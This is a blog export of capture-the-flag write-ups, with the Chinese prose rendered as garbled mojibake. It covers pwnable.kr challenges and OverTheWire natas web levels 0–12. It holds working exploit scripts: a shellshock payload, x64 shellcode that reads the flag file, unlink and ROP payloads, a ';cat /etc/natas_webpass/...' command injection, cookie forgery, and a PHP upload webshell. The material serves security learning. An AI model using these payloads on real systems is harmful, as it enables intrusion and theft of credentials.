typeæŒ‡çš„æ˜¯å¥—æ¥å­—ç±»å‹ï¼Œå¸¸ç”¨çš„ç±»å‹æœ‰ï¼š SOCK_STREAMï¼ˆTCPæµï¼‰ SOCK_DGRAMï¼ˆUDPæ•°æ®æŠ¥ï¼‰ SOCK_RAWï¼ˆåŸå§‹å¥—æ¥å­—ï¼‰æœ€åä¸€ä¸ª â€œprotocolâ€ä¸€èˆ¬è®¾ç½®ä¸ºâ€œ0â€ï¼Œä¹Ÿå°±æ˜¯å½“ç¡®å®šå¥—æ¥å­—ä½¿ç”¨çš„åè®®ç°‡å’Œç±»å‹æ—¶ï¼Œè¿™ä¸ªå‚æ•°çš„å€¼å°±ä¸º0ï¼Œä½†æ˜¯æœ‰æ—¶å€™åˆ›å»ºåŸå§‹å¥—æ¥å­—æ—¶ï¼Œå¹¶ä¸çŸ¥é“è¦ä½¿ç”¨çš„åè®®ç°‡å’Œç±»å‹ï¼Œä¹Ÿå°±æ˜¯domainå‚æ•°æœªçŸ¥æƒ…å†µä¸‹ï¼Œè¿™æ—¶protocolè¿™ä¸ªå‚æ•°å°±èµ·ä½œç”¨äº†ï¼Œå®ƒå¯ä»¥ç¡®å®šåè®®çš„ç§ç±»ã€‚ socketæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¹Ÿæœ‰è¿”å›å€¼ï¼Œå½“å¥—æ¥å­—åˆ›å»ºæˆåŠŸæ—¶ï¼Œè¿”å›å¥—æ¥å­—ï¼Œå¤±è´¥è¿”å›â€œ-1â€ï¼Œé”™è¯¯ä»£ç åˆ™å†™å…¥â€œerrnoâ€ä¸­ã€‚ ä¸€äº›socketå‡½æ•°: socket.connect(adress): è¿æ¥åˆ° address å¤„çš„è¿œç¨‹å¥—æ¥å­—ã€‚address çš„æ ¼å¼å–å†³äºåœ°å€ç°‡) socket.send(bytes[,flags]) å‘é€æ•°æ®ç»™å¥—æ¥å­—ã€‚æœ¬å¥—æ¥å­—å¿…é¡»å·²è¿æ¥åˆ°è¿œç¨‹å¥—æ¥å­—ã€‚ socket.close(fd) å…³é—­ä¸€ä¸ªå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ã€‚å®ƒç±»ä¼¼äºos.close()ï¼Œä½†æ˜¯ä¸“ç”¨äºå¥—æ¥å­— Exp: åœ¨/tempæ–‡ä»¶å¤¹å‘ç°çš„pythonå†™çš„expâ€¦ 123456789101112131415161718192021222324252627282930313233343536373839#argc=100#argv[&#x27;A&#x27;]=&#x27;x00&#x27;#argv[&#x27;B&#x27;]=&#x27;\\x20\\x0a\\x0d&#x27;argc = list(&#x27;A&#x27;) * 100argc[ord(&#x27;A&#x27;)] = &#x27;&#x27;argc[ord(&#x27;B&#x27;)] = b&#x27;\\x20\\x0a\\x0d&#x27; #set socket portargc[ord(&#x27;C&#x27;)] = &quot;5555&quot;argc[0] = &#x27;/home/input2/input&#x27;#2import osstdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, b&#x27;\\x00\\x0a\\x00\\xff&#x27;)os.write(stderr_w, b&#x27;\\x00\\x0a\\x02\\xff&#x27;)#3environ = &#123;b&#x27;\\xde\\xad\\xbe\\xef&#x27; : b&#x27;\\xca\\xfe\\xba\\xbe&#x27;&#125;#4f = open(b&#x27;\\x0a&#x27;,&#x27;wb&#x27;)f.write(b&#x27;\\x00\\x00\\x00\\x00&#x27;)f.close()import subprocessimport timesh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)time.sleep(2)#5import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((&#x27;127.0.0.1&#x27;,5555))s.send(b&#x27;\\xde\\xad\\xbe\\xef&#x27;)s.close() å¦å¤–ä¸€ä¸ªTipsï¼š tæƒé™ï¼ˆç²˜ç€ä½SBITï¼‰ï¼šä»»ä½•äººåœ¨è¯¥ç›®å½•ä¸‹æœ‰å†™æƒé™ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·ä¸èƒ½åˆ é™¤åˆ«äººçš„æ–‡ä»¶ æŸ¥çœ‹åˆ°tmpç›®å½•ä¸‹æ™®é€šç”¨æˆ·æœ‰-wtæƒé™ï¼Œæˆ‘ä»¬è¿›å…¥tmpç›®å½•ååˆ›å»ºè‡ªå·±çš„ä¸€ä¸ªç›®å½•ç„¶åæ‰§è¡Œa.py æ³¨æ„åˆ°å½“å‰ç›®å½•ä¸‹å¹¶æ²¡æœ‰flagï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºè½¯è¿æ¥ 1ln /home/input/flag flag legARMæ±‡ç¼–ï¼š è¿™ç¯‡ä¸€æ­¥åˆ°ä½ã€‚ç‚¹æˆ‘ 1234567891011(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 1.è¿”å›å€¼å­˜å‚¨åœ¨r0å¯„å­˜å™¨ ARMå¤„ç†å™¨æœ‰ä¸¤ç§å·¥ä½œçŠ¶æ€ï¼šARMçŠ¶æ€å’ŒThumbçŠ¶æ€ã€‚å¤„ç†å™¨å¯ä»¥åœ¨ä¸¤ç§çŠ¶æ€ä¸‹éšæ„åˆ‡æ¢ã€‚ å¤„äºARMçŠ¶æ€æ—¶ï¼Œæ‰§è¡Œ32ä½å­—å¯¹é½çš„ARMæŒ‡ä»¤ã€‚ å¤„äºThumbçŠ¶æ€æ—¶ï¼Œæ‰§è¡Œ16ä½å¯¹é½çš„ThumbæŒ‡ä»¤ã€‚ 2.ä¸¤ç§å·¥ä½œçŠ¶æ€ï¼š ARM å’Œ Thumb æŒ‡ä»¤é›†çš„åŠ¨æ€åˆ‡æ¢ï¼Œæ˜¯é€šè¿‡ BX æŒ‡ä»¤ä½¿ç”¨ä¸€ä¸ªå¯„å­˜å™¨åä½œä¸ºå‚æ•°æ¥å®Œæˆã€‚ç¨‹åºæ§åˆ¶æƒè¢«è½¬äº¤ç»™è¯¥å¯„å­˜å™¨ä¸­å­˜å‚¨çš„åœ°å€ ( LSB ä½è¢«å±è”½ )ã€‚ å¦‚æœ LSB=1, åˆ™è¿›å…¥ Thumb æŒ‡ä»¤å¤„ç†æ¨¡å¼ï¼› å¦‚æœ LSB=0, åˆ™è¿›å…¥ ARM æŒ‡ä»¤å¤„ç†æ¨¡å¼ã€‚ é€šä¿—ç‚¹è®²å…¶å®å°±æ˜¯BX è·³è½¬çš„åœ°å€æœ€ä½ä½ä¸º1è¿˜æ˜¯0æ¥åˆ¤æ–­æ˜¯è¿›å…¥ThumbæŒ‡ä»¤å¤„ç†æ¨¡å¼è¿˜æ˜¯è¿›äººARMæŒ‡ä»¤å¤„ç†æ¨¡å¼ 3.Thumbæ¨¡å¼ä¸‹PCå€¼=å½“å‰æŒ‡ä»¤åœ°å€å€¼+8 key1=0x00008cdc+8 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 ;æ­¤æ—¶r6æœ€åä¸€ä½æ˜¯1,è¿›å…¥ARM thumbæ¨¡å¼ pc&#x3D;adress+4 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. è¿™é‡Œè¿”å›å€¼ç”±r3ä¼ å…¥ã€‚ç„¶åå†çœ‹ä¸€ä¸‹åœ°å€ 0x00008d00 &lt;+16&gt;è¿™é‡Œï¼Œæœ‰ä¸ªbx r6ï¼Œè€Œr6ç­‰äºpc+1å³0x8d05ï¼Œæœ€ä½ä¸ºä¸º1ï¼Œæ‰€ä»¥æ‰§è¡Œbx r6ä¹‹åä¼šè¿›å…¥thumbæ¨¡å¼ï¼Œè¿™æ ·å°±ä¼šå˜æˆ2å­—èŠ‚å¯¹é½ï¼Œpcå­˜å‚¨ç€å½“å‰æŒ‡ä»¤åŠ 4çš„ä½ç½®ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œä¸‹é¢çš„mov r3,pcä¸­ï¼Œr3ç­‰äº0x8d04+0x4ã€‚ä¸‹ä¸€æ¡ä¸ºadds r3ï¼Œ#4ï¼Œè¡¨ç¤ºr3 = r3 + 4åæ›´æ–°æ ‡å¿—ä½ï¼Œå› æ­¤r3 = 0x8d04 + 0x4 + 0x4ã€‚ key2=0x8d04 + 0x4 + 0x4 123456789101112(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. æœ€ç»ˆkey3=lrçš„å€¼ lrå¯„å­˜å™¨ä¹Ÿå³R14å¯„å­˜å™¨ï¼Œç”¨ä½œå­ç¨‹åºé“¾æ¥ï¼Œç§°ä¸ºé“¾æ¥å¯„å­˜å™¨LK (Link Register)ã€‚ ä½œç”¨ï¼šä½¿ç”¨BLæˆ–BLXæ—¶ï¼Œè·³è½¬æŒ‡ä»¤è‡ªåŠ¨æŠŠè¿”å›åœ°å€æ”¾å…¥r14ä¸­ï¼›å­ç¨‹åºé€šè¿‡æŠŠr14å¤åˆ¶åˆ°PCæ¥å®ç°è¿”å› åœ¨mainå‡½æ•°æ‰¾åˆ°è°ƒç”¨keyæ—¶çš„ä»£ç  120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 BLæŒ‡ä»¤ï¼š Bæˆ–BLæŒ‡ä»¤å¼•èµ·å¤„ç†å™¨è½¬ç§»åˆ°â€œå­ç¨‹åºåâ€å¤„å¼€å§‹æ‰§è¡Œã€‚ä¸¤è€…çš„ä¸åŒä¹‹å¤„åœ¨äº:(1)BLæŒ‡ä»¤åœ¨è½¬ç§»åˆ°å­ç¨‹åºæ‰§è¡Œä¹‹å‰ï¼Œå°†å…¶ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ‹·è´åˆ°R14ï¼ˆLR,é“¾æ¥å¯„å­˜å™¨ï¼‰ã€‚ ç”±äºBLæŒ‡ä»¤ä¿å­˜äº†ä¸‹æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå› æ­¤ä½¿ç”¨æŒ‡ä»¤â€œMOV PC ,LRâ€å³å¯å®ç°å­ç¨‹åºçš„è¿”å›ã€‚(2)BæŒ‡ä»¤åˆ™æ— æ³•å®ç°å­ç¨‹åºçš„è¿”å›ï¼Œåªèƒ½å®ç°å•çº¯çš„è·³è½¬ã€‚ç”¨æˆ·åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œå¯æ ¹æ®å…·ä½“åº”ç”¨é€‰ç”¨åˆé€‚çš„å­ç¨‹åºè°ƒç”¨è¯­å¥ã€‚ key3=0x8d80 ä¸‰ä¸ªæ•°ç›¸åŠ å³å¯ Exp: 108400 mistakeç¬¦å·ä¼˜å…ˆçº§ç›¸å…³ 1if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)) æ¯”è¾ƒè¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºèµ‹å€¼è¿ç®—ç¬¦ï¼Œå› æ­¤å®é™…ä¸Šfdæœ€ç»ˆå¹¶ä¸æ˜¯ç†æƒ³çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ˜¯0æ‰å¯¹ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œ0ä½œä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒæŒ‡å‘çš„æ˜¯stdinã€‚ ä¸¤ä¸ªè¾“å…¥éƒ½ç”±æˆ‘ä»¬æ„é€ ï¼Œè‡ªç”±å‘æŒ¥å³å¯ã€‚ã€‚ Exp: 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;mistake&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;./mistake&#x27;)payload=&#x27;B&#x27;*10sh.sendafter(&quot;do not bruteforce...\\n&quot;,payload)payload=&#x27;C&#x27;*10sh.sendafter(&quot;input password : &quot;,payload)sh.interactive() shellshockCVE-2014-6271ï¼ˆç ´å£³æ¼æ´ï¼‰é¢å‘Googleè§£é¢˜ Link Exp: 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;shellshock&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;sh&#x27;)sh.sendline(&quot;env x=&#x27;() &#123; :;&#125;; bash -c \\&quot;cat flag\\&quot; &#x27; ./shellshock&quot;)sh.interactive() coin11234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import reio=remote(&quot;pwnable.kr&quot;,&quot;9007&quot;)io.recv()def GetWeight(l,r): sendstr = &quot;&quot; if l==r: io.sendline(str(l)) else : for i in range(l,r+1): sendstr = sendstr + str(i)+&quot; &quot; io.sendline(sendstr) ret = io.recvline() return int(ret)def solve(num,chance): l=0 r=num-1 weight=0 for i in range(0,chance): weight=GetWeight(l,int(l+(r-l)/2)) if weight%10!=0: r = int(l+(r-l)/2) else: l = int(l+(r-l)/2)+1 io.sendline(str(r)) print(io.recv())quest=io.recvline().decode()data=re.findall(r&quot;\\d+&quot;,quest)N=int(data[0])C=int(data[1])solve(N,C)print(io.recv(1024)) asm123456789101112131415#coding=utf-8from pwn import *context(arch=&quot;amd64&quot;,os=&quot;Linux&quot;)shell = ssh(host=&quot;pwnable.kr&quot;,user=&quot;asm&quot;,port=2222,password=&quot;guest&quot;)#shell.download_file(&quot;./asm.c&quot;)io = shell.connect_remote(&quot;0.0.0.0&quot;,9026)filename=&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;shellcode=&quot;&quot;shellcode+=shellcraft.open(filename)#æ‰“å¼€æ–‡ä»¶åˆ° rax(è¿”å›å€¼)shellcode+=shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,100)#è¯»æ–‡ä»¶ 100ä¸ªå­—èŠ‚ åˆ°æ ˆä¸Š (rsp)shellcode+=shellcraft.write(1,&#x27;rsp&#x27;,100)#ä»rsp å†™åˆ°stdout=1 (stdin=0) io.sendafter(&quot;give me your x64 shellcode:&quot;,asm(shellcode))io.interactive() unlink1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;unlink&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&quot;./unlink.c&quot;)io=process(&quot;./unlink&quot;)shell_addr=0x080484EBre=io.recvline().decode()stack_addr=int(re.split(&quot;:&quot;)[1],16) # &amp;Are=io.recvline().decode()heap_addr=int(re.split(&quot;:&quot;)[1],16) # Aio.recvline()&#x27;&#x27;&#x27;typedef struct tagOBJ&#123; struct tagOBJ* fd;//4 byte struct tagOBJ* bk;//4 byte char buf[8];//8 byte&#125;OBJ;&#x27;&#x27;&#x27;payload = p32(shell_addr)#(A-&gt;buf(0~3))payload +=b&quot;a&quot;*20#(A-&gt;buf(4~7)+padding(0x08))payload += p32(heap_addr+0x8+0x4)#(B-&gt;fd)payload += p32(stack_addr+0x14-0x4)#(B-&gt;bk)#print hex(stack_addr)+&quot; &quot;+hex(heap_addr)io.send(payload)io.interactive() horcruxes1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context(arch=&quot;amd64&quot;,os=&quot;Linux&quot;,log_level=&quot;DEBUG&quot;)shell = ssh(host=&quot;pwnable.kr&quot;,user=&quot;horcruxes&quot;,port=2222,password=&quot;guest&quot;)#shell.download_file(&quot;./horcruxes&quot;)io=shell.connect_remote(&quot;0.0.0.0&quot;,9032)payload=&quot;1&quot;#io.sendlineafter(&quot;guess the password!&quot;,&quot;cat: password: Permission denied&quot;)io.recv()io.sendline(payload)a_addr=0x0809FE4Bb_addr=0x0809FE6Ac_addr=0x0809FE89d_addr=0x0809FEA8e_addr=0x0809FEC7f_addr=0x0809FEE6g_addr=0x0809FF05call_ropme_addr=0x0809FFFCpayload=b&#x27;a&#x27;*(0x74+0x4)+p32(a_addr)+p32(b_addr)+p32(c_addr)+p32(d_addr)+p32(e_addr)+p32(f_addr)+p32(g_addr)+p32(call_ropme_addr)#å½“å‡½æ•°A()æ‰§è¡Œç»“æŸä¹‹åï¼Œæ‰§è¡ŒreturnæŒ‡ä»¤çš„åœ°å€åº”å°±æ˜¯å4ä¸ªbytesï¼Œæ‰€ä»¥ç›´æ¥å°†åœ°å€ç½—åˆ—åœ¨paddingæ•°æ®ä¹‹åï¼Œå‡½æ•°ä¼šä¸€ä¸ªä¸€ä¸ªçš„è¿›è¡Œè·³è½¬io.sendlineafter(&quot;How many EXP did you earned? :&quot;,payload)exp=0io.recvline()for i in range(7): re = io.recvline().decode() u = int(re.strip(&#x27;\\n&#x27;).split(&#x27;+&#x27;)[1][:-1]) print (u) exp += uprint (&quot;Exp: &quot;+str(exp))io.sendlineafter(&quot;Select Menu:&quot;,&quot;1&quot;)io.sendlineafter(&quot;How many EXP did you earned? :&quot;,str(exp))io.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Webé¢˜è§£_natas","slug":"Web_1","date":"2021-06-15T17:24:39.000Z","updated":"2022-03-25T14:03:31.000Z","comments":true,"path":"2021/06/16/Web_1/","link":"","permalink":"http://example.com/2021/06/16/Web_1/","excerpt":"","text":"Webé¢˜è§£_natasEasy_webå…¥é—¨åˆ·é¢˜ Level_0Check Souce code Level_0â¡Level_1Check Souce code Level_1â¡Level_2å‘ç°æœ‰ä¸ªpngå›¾ç‰‡ï¼Œè®¿é—®ä¸Šçº§ç›®å½•å¯æŸ¥çœ‹åˆ°æœ‰flagçš„txtæ–‡æ¡£ Level_2â¡Level_3Robotsåè®®è®¿é—®/robots.txtæŸ¥çœ‹åˆ°å­˜åœ¨ç›®å½•/s3cr3t/è®¿é—®å³å¯å¾—åˆ°flag Level_3â¡Level_4æ ¹æ®æç¤ºç”¨BurpsuiteæŠ“åŒ…æ”¹HTTPRefererå‘é€å³å¯ Level_4â¡Level_5Learn about cookieæ›´æ”¹cookieä¸­Loggedin å€¼ä¸º1å³å¯ Level_5â¡Level_612345678910&lt;?include &quot;includes/secret.inc&quot;;if(array_key_exists(&quot;submit&quot;, $_POST))&#123;if($secret == $_POST[&#x27;secret&#x27;])&#123;print&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;&#125;else&#123;print&quot;Wrong secret&quot;;&#125;&#125;?&gt; å‘ç°å¯¼å…¥äº†â€includes/secret.incâ€ ï¼Œæ¯”è¾ƒçš„æ—¶å€™è®¿é—®è¯¥ç›®å½•å¯çœ‹åˆ°å¯†ç ï¼Œæäº¤å³å¯ Level_6â¡Level_7include()æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨æˆ·ä¼ å…¥çš„pageå‚æ•°æœªç»è¿‡æ»¤ç›´æ¥è°ƒç”¨include()å‡½æ•°ï¼Œä¼ å…¥/etc/natas_webpass/natas8ä½œä¸ºå‚æ•°å³å¯ã€‚ Level_7â¡Level_81234567891011121314151617&lt;?$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;function encodeSecret($secret) &#123; return bin2hex(strrev(base64_encode($secret)));&#125;if(array_key_exists(&quot;submit&quot;, $_POST)) &#123; if(encodeSecret($_POST[&#x27;secret&#x27;]) == $encodedSecret) &#123; print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;; &#125; else &#123; print &quot;Wrong secret&quot;; &#125;&#125;?&gt; æ ¹æ®åŠ å¯†è¿‡ç¨‹è§£å¯†å³å¯ ç»ƒä¹ ä¸€ä¸‹python 123456789import base64byte=b&#x27;\\x3d\\x3d\\x51\\x63\\x43\\x74\\x6d\\x4d\\x6d\\x6c\\x31\\x56\\x69\\x56\\x33\\x62&#x27;t=byte.decode()print(t)t=t[::-1]#å­—ç¬¦åˆ‡ç‰‡print(t) t=base64.b64decode(t)print(t) ç»ƒä¹ ä¸€ä¸‹linuxå‘½ä»¤ ä¼˜é›…ç®€æ´:) 1echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d -r | -revert reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere. Level_8â¡Level_9Learn about passthru()passtru():exec() å‡½æ•°ç±»ä¼¼ï¼Œ passthru() å‡½æ•°ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼ˆ command ï¼‰çš„ã€‚ ç”¨æˆ·è¾“å…¥æœªè¿‡æ»¤ï¼Œç›´æ¥ç”¨ ; æˆªæ–­grep å‘½ä»¤cat flag 1;cat /etc/natas_webpass/natas10 Level_9â¡Level_10æ³¨æ„åˆ°å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†åªæ˜¯è¿‡æ»¤äº†; | &amp;ç‰¹æ®Šå­—ç¬¦ Uage of grep and regex1grep &#x27;[A-Za-z]&#x27; æ–‡ä»¶å Demo: 123[a-zA-Z] /etc/natas_webpass/natas11Or. /etc/natas_webpass/natas11 Level_10â¡Level_11Learn about the XOR &amp; PHP Code&amp; Json Souce Code Analyse: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//é¢„å®šä¹‰å‚æ•°ï¼ŒçŒœæµ‹å°†showpasswordè®¾ç½®ä¸ºyeså³å¯å¾—åˆ°å¯†ç ã€‚$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); //å¼‚æˆ–åŠ å¯†å‡½æ•°function xor_encrypt($in) &#123; $key = &#x27;&lt;censored&gt;&#x27;; //é¢„å®šå‚æ•°key $text = $in; //è¾“å…¥å‚æ•° $outText = &#x27;&#x27;; //è¾“å‡ºå‚æ•° // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; //forå¾ªç¯ï¼Œéå†è¾“å…¥å‚æ•° $outText .= $text[$i] ^ $key[$i % strlen($key)]; //å°†è¾“å…¥å‚æ•°å¯¹åº”ä½å’Œkeyå¯¹åº”ä½å¼‚æˆ–ï¼Œkeyä½æ•°ä¸å¤Ÿåˆ™ä»å¤´å¾ªç¯ï¼Œç»“æœå­˜åˆ°è¾“å‡ºå‚æ•° &#125; return $outText; //è¿”å›åŠ å¯†ç»“æœ&#125; //åŠ è½½å‡½æ•°ï¼šå°†$_COOKIE[&quot;data&quot;]è§£å¯†è¿˜åŸï¼Œå­˜ä¸º $mydata æ•°ç»„ï¼Œè¿”å›$mydataã€‚function loadData($def) &#123; global $_COOKIE; $mydata = $def; if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123; $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true); if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123; if (preg_match(&#x27;/^#(?:[a-f\\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123; $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;]; $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;]; &#125; &#125; &#125; return $mydata;&#125; //ä¿å­˜å‡½æ•°ï¼šå°†ä¼ å…¥çš„å‚æ•°ï¼Œç»è¿‡ç¼–ç å¤„ç†ï¼Œå­˜å…¥$_COOKIE[&quot;data&quot;]ä¸­ã€‚function saveData($d) &#123; setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));&#125; $data = loadData($defaultdata); if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123; if (preg_match(&#x27;/^#(?:[a-f\\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123; $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;]; &#125;&#125; saveData($data); //å°†showpasswordè®¾ç½®ä¸ºyeså³å¯å¾—åˆ°å¯†ç if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123; print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;&#125; å…ˆæ±‚Keyï¼š 12345678910111213&lt;?php$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);$data= &#x27;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#x27;;function xor_encrypt($in,$out) &#123; $key =&#x27;&#x27; ; $text = $in; for($i=0;$i&lt;strlen($text);$i++) &#123; $key .= $text[$i] ^ $out[$i]; &#125; return $key;&#125; echo xor_encrypt(json_encode($defaultdata),base64_decode($data));?&gt; å†æ„é€ Expçš„Cookie: 1234567891011121314&lt;?php$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);function xor_encrypt($in) &#123; $key = &#x27;qw8J&#x27;; $text = $in; $outText = &#x27;&#x27;; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; $outText .= $text[$i] ^ $key[$i % strlen($key)]; &#125; return $outText;&#125;echo base64_encode(xor_encrypt(json_encode($defaultdata))); Tips: ç®€å•ç†Ÿæ‚‰ä¸€äº›PHPçš„è¯­æ³•ï¼Œæ¯”å¦‚Jsonæ ¼å¼ï¼Œä¿è¯åŸºæœ¬å‡½æ•°èƒ½çœ‹æ‡‚ï¼Œç†è§£ä»£ç çš„é€»è¾‘ã€‚ 1234567891011121314151617181920212223import jsonimport base64def myxor(text,key): key=key text=text out=&#x27;&#x27; for i in range(0,len(text)): out+=chr((text[i])^(key[i%len(key)])) return outcookie=&#x27;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#x27;Ori=&#123;&#x27;showpassword&#x27;:&#x27;yes&#x27;,&#x27;bgcolor&#x27;:&#x27;#ffffff&#x27;&#125;Old=&#123;&#x27;showpassword&#x27;:&#x27;no&#x27;,&#x27;bgcolor&#x27;:&#x27;#ffffff&#x27;&#125;json_old=json.dumps(Old).replace(&quot; &quot;,&quot;&quot;)json_ori=json.dumps(Ori).replace(&quot; &quot;,&quot;&quot;)#print(myxor(base64.b64decode(cookie),json_old.encode()))out=base64.b64encode(myxor(json_ori.encode(),&#x27;qw8J&#x27;.encode()).encode())print(out.decode()) EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 Level_11â¡Level_12Ez_upload ä¸Šä¼ äº†ä¸ªå›¾ç‰‡åå‘ç°ï¼Œæ–‡ä»¶åä¼šè¢«éšæœºé‡ç½®ï¼Œåç¼€æ”¹ä¸ºjpgï¼Œå¹¶ä¸”ä¸Šä¼ æˆåŠŸåä¼šæœ‰è·¯å¾„ä¿¡æ¯å›æ˜¾ã€‚å¯ä»¥è€ƒè™‘ä¸Šä¼ ä¸ªphpæ–‡ä»¶ç„¶åæ ¹æ®å›æ˜¾è·¯å¾„è§£æã€‚ 12345&lt;?phpsystem(&#x27;cat /etc/natas_webpass/natas13&#x27;);?&gt; ç”¨æˆ·ä¸Šä¼ æ•°æ®æ£€æµ‹åŸºæœ¬æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼š 1&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; åªæ˜¯åç¼€æ¢æˆäº†.jpg BurpæŠ“åŒ…æ”¹æ–‡ä»¶ååç¼€å³å¯ jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 